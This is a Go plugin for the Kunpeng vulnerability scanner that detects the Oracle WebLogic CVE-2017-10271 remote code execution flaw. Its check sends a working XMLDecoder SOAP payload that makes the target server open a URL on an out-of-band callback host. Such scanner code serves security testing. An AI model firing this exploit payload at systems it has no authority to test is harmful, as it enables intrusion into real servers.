package goplugin

import (
	"fmt"
	"net/http"
	"strings"

	"github.com/opensec-cn/kunpeng/plugin"
	"github.com/opensec-cn/kunpeng/util"
)

type weblogicWLSRCE struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("weblogic", &weblogicWLSRCE{})
}
func (d *weblogicWLSRCE) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "WebLogic WLS RCE ",
		Remarks: "Oracle WebLogic Server WLS安全组件中的缺陷导致远程命令执行",
		Level:   0,
		Type:    "RCE",
		Author:  "wolf",
		References: plugin.References{
			URL: "https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271",
			CVE: "CVE-2017-10271",
		},
	}
	return d.info
}
func (d *weblogicWLSRCE) GetResult() []plugin.Plugin {
	return d.result
}
func (d *weblogicWLSRCE) Check(URL string, meta plugin.TaskMeta) bool {
	if util.GetAiderNetloc() == "" {
		return false
	}
	postData := `
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
      <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8" class="java.beans.XMLDecoder">
          <void class="java.net.URL">
            <string>http://%s/add/%s</string>
            <void method="openStream"/>
          </void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
  </soapenv:Envelope>`
	rand := util.GetRandomString(5)
	postData = fmt.Sprintf(postData, util.GetAiderNetloc(), rand)
	request, _ := http.NewRequest("POST", URL+"/wls-wsat/CoordinatorPortType", strings.NewReader(postData))
	request.Header.Set("Content-Type", "text/xml;charset=UTF-8")
	request.Header.Set("SOAPAction", "")
	resp, err := util.RequestDo(request, true)
	if err != nil {
		return false
	}
	if util.AiderCheck(rand) {
		result := d.info
		result.Response = resp.ResponseRaw
		result.Request = resp.RequestRaw
		d.result = append(d.result, result)
		return true
	}
	return false
}
